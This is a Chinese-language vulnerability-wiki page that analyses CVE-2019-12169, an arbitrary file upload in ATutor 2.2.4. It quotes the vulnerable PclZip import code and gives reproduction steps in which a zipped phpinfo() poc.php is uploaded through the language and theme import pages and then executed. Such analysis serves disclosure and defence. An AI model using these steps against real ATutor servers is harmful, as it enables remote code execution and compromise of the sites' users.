<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/ATutor/%EF%BC%88CVE-2019-12169%EF%BC%89ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2019-12169\uff09ATutor\u5b66\u4e60\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../AVCON/AVCON-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0download.action%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../AVCON/AVCON-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0download.action%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        AVCON-系统管理平台download.action存在任意文件读取漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../AJ-Report/CNVD-2024-15077/README.zh-cn/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../AJ-Report/CNVD-2024-15077/README.zh-cn/" class="btn btn-xs btn-link">
        AJ-Report 认证绕过与远程代码执行漏洞（CNVD-2024-15077）
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2019-12169atutor">（CVE-2019-12169）ATutor学习内容管理系统 任意文件上传漏洞<a class="headerlink" href="#cve-2019-12169atutor" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>ATutor是ATutor团队的一套开源的基于Web的学习内容管理系统（LCMS）。该系统包括教学内容管理、论坛、聊天室等模块。Atutor与Claroline、
Moddle及Sakai号称为四大开源课程管理系统。</p>
<p>ATutor2.2.4语言导入功能处存在一处安全漏洞(CVE-2019-12169)。攻击者可利用该漏洞进行远程代码执行攻击。</p>
<p>经过分析发现，除了CVE-2019-1216所报道的语言导入功能外，ATutor在其他功能模块中也大量存在着相似的漏洞，本文会在后面针对这一点进行介绍。</p>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>ATutor 2.2.4</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>据漏洞披露可知，漏洞触发点存在于<code>mods/_core/languages/language_import.php</code>文件中</p>
<p>首先跟入language_import.php文件</p>
<div class="codehilite"><pre><span></span><code><span class="n">PHP</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
<span class="o">/****************************************************************/</span>
<span class="o">/*</span><span class="w"> </span><span class="n">ATutor</span><span class="w">                                         </span><span class="o">*/</span>
<span class="o">/****************************************************************/</span>
<span class="o">/*</span><span class="w"> </span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="p">)</span><span class="w"> </span><span class="mi">2002</span><span class="o">-</span><span class="mi">2010</span><span class="w">                                      </span><span class="o">*/</span>
<span class="o">/*</span><span class="w"> </span><span class="n">Inclusive</span><span class="w"> </span><span class="n">Design</span><span class="w"> </span><span class="n">Institute</span><span class="w">                                   </span><span class="o">*/</span>
<span class="o">/*</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">atutor</span><span class="o">.</span><span class="n">ca</span><span class="w">                                     </span><span class="o">*/</span>
<span class="o">/*</span><span class="w">                                                              </span><span class="o">*/</span>
<span class="o">/*</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">free</span><span class="w"> </span><span class="n">software</span><span class="o">.</span><span class="w"> </span><span class="n">You</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">redistribute</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="ow">and</span><span class="o">/</span><span class="ow">or</span><span class="o">*/</span>
<span class="o">/*</span><span class="w"> </span><span class="n">modify</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">under</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">terms</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">GNU</span><span class="w"> </span><span class="n">General</span><span class="w"> </span><span class="n">Public</span><span class="w"> </span><span class="n">License</span><span class="w">  </span><span class="o">*/</span>
<span class="o">/*</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">published</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Free</span><span class="w"> </span><span class="n">Software</span><span class="w"> </span><span class="n">Foundation</span><span class="o">.</span><span class="w">            </span><span class="o">*/</span>
<span class="o">/****************************************************************/</span>
<span class="o">//</span><span class="w"> </span><span class="o">$</span><span class="n">Id</span><span class="o">$</span>

<span class="n">define</span><span class="p">(</span><span class="s1">&#39;AT_INCLUDE_PATH&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;../../../include/&#39;</span><span class="p">);</span>
<span class="n">require</span><span class="p">(</span><span class="n">AT_INCLUDE_PATH</span><span class="o">.</span><span class="s1">&#39;vitals.inc.php&#39;</span><span class="p">);</span>
<span class="n">admin_authenticate</span><span class="p">(</span><span class="n">AT_ADMIN_PRIV_LANGUAGES</span><span class="p">);</span>

<span class="n">require_once</span><span class="p">(</span><span class="n">AT_INCLUDE_PATH</span><span class="o">.</span><span class="s1">&#39;classes/pclzip.lib.php&#39;</span><span class="p">);</span>
<span class="n">require_once</span><span class="p">(</span><span class="n">AT_INCLUDE_PATH</span><span class="o">.</span><span class="s1">&#39;../mods/_core/languages/classes/LanguageEditor.class.php&#39;</span><span class="p">);</span>
<span class="n">require_once</span><span class="p">(</span><span class="n">AT_INCLUDE_PATH</span><span class="o">.</span><span class="s1">&#39;../mods/_core/languages/classes/LanguagesParser.class.php&#39;</span><span class="p">);</span>

<span class="o">/*</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">avoid</span><span class="w"> </span><span class="n">timing</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">large</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="o">*/</span>
<span class="err">@</span><span class="n">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>

<span class="o">$</span><span class="n">_SESSION</span><span class="p">[</span><span class="s1">&#39;done&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>

<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;submit_import&#39;</span><span class="p">])){</span>
<span class="w">    </span><span class="n">require_once</span><span class="p">(</span><span class="n">AT_INCLUDE_PATH</span><span class="o">.</span><span class="s1">&#39;../mods/_core/languages/classes/RemoteLanguageManager.class.php&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="o">$</span><span class="n">remoteLanguageManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">RemoteLanguageManager</span><span class="p">();</span>
<span class="w">    </span><span class="o">$</span><span class="n">language_code</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">explode</span><span class="p">(</span><span class="s2">&quot;_&quot;</span><span class="p">,</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;language&#39;</span><span class="p">]);</span>
<span class="w">    </span><span class="o">$</span><span class="n">remoteLanguageManager</span><span class="o">-&gt;</span><span class="n">import</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;language&#39;</span><span class="p">]);</span>
<span class="w">    </span><span class="n">header</span><span class="p">(</span><span class="s1">&#39;Location: language_import.php&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="n">exit</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">is_uploaded_file</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;size&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">$</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">addError</span><span class="p">(</span><span class="s1">&#39;LANG_IMPORT_FAILED&#39;</span><span class="p">);</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">$</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">addError</span><span class="p">(</span><span class="s1">&#39;IMPORTFILE_EMPTY&#39;</span><span class="p">);</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="o">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">is_uploaded_file</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="o">$</span><span class="n">languageManager</span><span class="o">-&gt;</span><span class="n">import</span><span class="p">(</span><span class="o">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
<span class="w">    </span><span class="n">header</span><span class="p">(</span><span class="s1">&#39;Location: ./language_import.php&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="n">exit</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>从language_import.php文件中35行起，可以发现文件上传相关代码</p>
<p><img alt="1.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId24.png" /></p>
<p>从上图红框中代码可知，此处代码块是对文件上传情况进行校验</p>
<p>在文件成功上传后，进入下一个if分支</p>
<p><img alt="2.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId25.png" /></p>
<p>在这个分支里，程序将调用$languageManager-&gt;import方法对文件进行处理</p>
<p>继续跟入import方法，位于<code>/mods/_core/languages/classes/LanguageManager.class.php</code>文件中</p>
<div class="codehilite"><pre><span></span><code><span class="n">PHP</span>
<span class="o">//</span> <span class="n">public</span>
<span class="o">//</span> <span class="kn">import</span><span class="w"> </span><span class="nn">language</span> <span class="n">pack</span> <span class="kn">from</span><span class="w"> </span><span class="nn">specified</span> <span class="n">file</span>
<span class="n">function</span> <span class="n">import</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">global</span> <span class="err">$</span><span class="n">languageManager</span><span class="p">,</span> <span class="err">$</span><span class="n">msg</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="err">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="s1">&#39;master&#39;</span><span class="p">)){</span>
        <span class="o">//</span> <span class="n">hack</span> <span class="n">to</span> <span class="n">create</span> <span class="n">path</span> <span class="n">to</span> <span class="n">subdir</span> <span class="k">for</span> <span class="n">imported</span> <span class="n">github</span> <span class="n">language</span> <span class="n">packs</span>
        <span class="err">$</span><span class="n">import_dir</span> <span class="o">=</span> <span class="n">str_replace</span><span class="p">(</span><span class="s2">&quot;.zip&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="err">$</span><span class="n">_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;language&#39;</span><span class="p">])){</span>
        <span class="err">$</span><span class="n">import_dir</span> <span class="o">=</span> <span class="err">$</span><span class="n">_POST</span><span class="p">[</span><span class="s1">&#39;language&#39;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;-master/&#39;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">require_once</span><span class="p">(</span><span class="n">AT_INCLUDE_PATH</span><span class="o">.</span><span class="s1">&#39;classes/pclzip.lib.php&#39;</span><span class="p">);</span>
    <span class="n">require_once</span><span class="p">(</span><span class="n">AT_INCLUDE_PATH</span><span class="o">.</span><span class="s1">&#39;../mods/_core/languages/classes/LanguagesParser.class.php&#39;</span><span class="p">);</span>

    <span class="err">$</span><span class="n">import_path</span> <span class="o">=</span> <span class="n">AT_CONTENT_DIR</span> <span class="o">.</span> <span class="s1">&#39;import/&#39;</span><span class="p">;</span>
    <span class="err">$</span><span class="n">import_path_tmp</span> <span class="o">=</span> <span class="err">$</span><span class="n">import_path</span><span class="o">.</span><span class="err">$</span><span class="n">import_dir</span><span class="p">;</span>
    <span class="err">$</span><span class="n">language_xml</span> <span class="o">=</span> <span class="nd">@file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="n">import_path</span><span class="o">.</span><span class="s1">&#39;language.xml&#39;</span><span class="p">);</span>
    <span class="err">$</span><span class="n">archive</span> <span class="o">=</span> <span class="n">new</span> <span class="n">PclZip</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="err">$</span><span class="n">archive</span><span class="o">-&gt;</span><span class="n">extract</span><span class="p">(</span>   <span class="n">PCLZIP_OPT_PATH</span><span class="p">,</span>    <span class="err">$</span><span class="n">import_path</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;Error : &#39;</span> <span class="o">.</span> <span class="err">$</span><span class="n">archive</span><span class="o">-&gt;</span><span class="n">errorInfo</span><span class="p">(</span><span class="n">true</span><span class="p">));</span>
    <span class="p">}</span>
</code></pre></div>

<p>在import方法中程序调用PclZip对压缩包进行处理</p>
<div class="codehilite"><pre><span></span><code><span class="n">PHP</span>
<span class="err">$</span><span class="n">archive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">PclZip</span><span class="p">(</span><span class="err">$</span><span class="n">filename</span><span class="p">);</span>

<span class="nf">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">archive</span><span class="o">-&gt;</span><span class="n">extract</span><span class="p">(</span><span class="w">   </span><span class="n">PCLZIP_OPT_PATH</span><span class="p">,</span><span class="w">    </span><span class="err">$</span><span class="n">import_path</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">exit</span><span class="p">(</span><span class="s">&#39;Error : &#39;</span><span class="w"> </span><span class="p">.</span><span class="w"> </span><span class="err">$</span><span class="n">archive</span><span class="o">-&gt;</span><span class="n">errorInfo</span><span class="p">(</span><span class="kr">true</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div>

<p>为了更好的理解import方法的执行流程，我们将会进行动态调试。首先构造一个poc.php</p>
<div class="codehilite"><pre><span></span><code><span class="nx">PHP</span>
<span class="cp">&lt;?php</span> <span class="nb">phpinfo</span><span class="p">();</span> <span class="cp">?&gt;</span>
</code></pre></div>

<p>将这个poc.php打包为poc.zip</p>
<p><img alt="3.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId26.png" /></p>
<p>访问如下链接以进入上传页面</p>
<p><code>https://www.0-sec.org/ATutor/mods/_core/languages/language_import.php</code></p>
<p><img alt="4.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId27.png" /></p>
<p>在上传语言包页面中选择构造好的poc.zip并点击import按钮上传。当请求发送给后台服务器，程序执行到下图断点处</p>
<p><img alt="5.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId28.png" /></p>
<p>此时的$import_path值为atutor应用的/content/import路径："content/import/"，程序调用PclZip的extract方法对压缩包进行解压。接下来我们介绍以下PclZip类</p>
<p><strong>PclZip</strong></p>
<p>PclZip是一个强大的压缩与解压缩zip文件的PHP类，PclZip
library不仅能够压缩与解压缩Zip格式的文件；还能解压缩文档中的内容，同时也可以对现有的ZIP包进行添加或删除文件。</p>
<p>我们接下来看下import方法中是如何使用PclZip，见下图</p>
<p><img alt="6.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId29.png" /></p>
<p>程序创建了上传的zip压缩包的一个PclZip对象进行操作与控制，在解压过程中使用了extract方法。该方法中第一个参数是设置项，第二个是对应设置项的值</p>
<p>我们来看下PCLZIP_OPT_PATH设置项的作用</p>
<p><img alt="7.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId30.png" /></p>
<p>可见，PCLZIP_OPT_PATH设置项指定我们上传的zip文件解压目录为$import_path参数对应的路径</p>
<p>解压成功后，poc.zip中内容出现在对应文件夹中</p>
<p><img alt="8.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId31.png" /></p>
<p>查看poc.php中的值，可以发现poc上传成功</p>
<p><img alt="9.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId32.png" /></p>
<p>访问如下地址，触发poc</p>
<p><img alt="10.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId33.png" /></p>
<p>除此之外，该应用几乎所有import接口，在后台都采用PclZip将上传的zip解压到对应目录中。然而这些操作无一例外的未对压缩包中的文件进行校验。下面举几个例子：</p>
<p>位于<code>mods/_core/themes/import.php</code>文件中的主题导入功能,代码如下:</p>
<div class="codehilite"><pre><span></span><code><span class="n">PHP</span>
<span class="cm">/**</span>
<span class="cm">* Imports a theme from a URL or Zip file to Atutor</span>
<span class="cm">* @access  private</span>
<span class="cm">* @author  Shozub Qureshi</span>
<span class="cm">*/</span>
<span class="k">function</span><span class="w"> </span><span class="n">import_theme</span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="k">global</span><span class="w"> </span><span class="err">$</span><span class="n">db</span><span class="p">;</span>
<span class="w">    </span><span class="k">global</span><span class="w"> </span><span class="err">$</span><span class="n">msg</span><span class="p">;</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;url&#39;</span><span class="o">]</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;url&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s1">&#39;http://&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">content</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">@file_get_contents</span><span class="p">(</span><span class="err">$</span><span class="n">_POST</span><span class="o">[</span><span class="n">&#39;url&#39;</span><span class="o">]</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>

<span class="w">    </span><span class="err">⋮</span>

<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">unzip</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="k">save</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">themes</span>
<span class="w">    </span><span class="err">$</span><span class="n">archive</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">PclZip</span><span class="p">(</span><span class="err">$</span><span class="n">_FILES</span><span class="o">[</span><span class="n">&#39;file&#39;</span><span class="o">][</span><span class="n">&#39;tmp_name&#39;</span><span class="o">]</span><span class="p">);</span>

<span class="w">    </span><span class="o">//</span><span class="k">extract</span><span class="w"> </span><span class="n">contents</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">importpath</span><span class="o">/</span><span class="n">foldrname</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">!$</span><span class="n">archive</span><span class="o">-&gt;</span><span class="k">extract</span><span class="p">(</span><span class="err">$</span><span class="n">import_path</span><span class="p">))</span><span class="w"> </span><span class="err">{</span>
<span class="w">        </span><span class="err">$</span><span class="n">errors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;IMPORT_ERROR_IN_ZIP&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">archive</span><span class="o">-&gt;</span><span class="n">errorInfo</span><span class="p">(</span><span class="k">true</span><span class="p">));</span>
<span class="w">        </span><span class="n">clr_dir</span><span class="p">(</span><span class="err">$</span><span class="n">import_path</span><span class="p">);</span>
<span class="w">        </span><span class="err">$</span><span class="n">msg</span><span class="o">-&gt;</span><span class="n">addError</span><span class="p">(</span><span class="err">$</span><span class="n">errors</span><span class="p">);</span>
<span class="w">        </span><span class="n">header</span><span class="p">(</span><span class="s1">&#39;Location: index.php&#39;</span><span class="p">);</span><span class="w"> </span>
<span class="w">        </span><span class="k">exit</span><span class="p">;</span>
<span class="w">    </span><span class="err">}</span>
</code></pre></div>

<p>可以发现这里也使用了extract方法将上传文件进行解压</p>
<p>来看一下导入主题功能对应的前端页面</p>
<p><img alt="11.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId34.png" /></p>
<p>这里页面与导入语音包的页面极其相似，只不过最终解压后存放的路径不同，不再是content/import/，而是themes/</p>
<p>在此处上传构造好的poc.zip，最终poc.php将会被解压到themes文件夹中</p>
<p><img alt="12.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId35.png" /></p>
<p>位于<code>/mods/_standard/tests/question_import.php</code>文件的问题导入功能</p>
<p><img alt="13.png" src="../resource/%28CVE-2019-12169%29ATutor%E5%AD%A6%E4%B9%A0%E5%86%85%E5%AE%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/media/rId36.png" /></p>
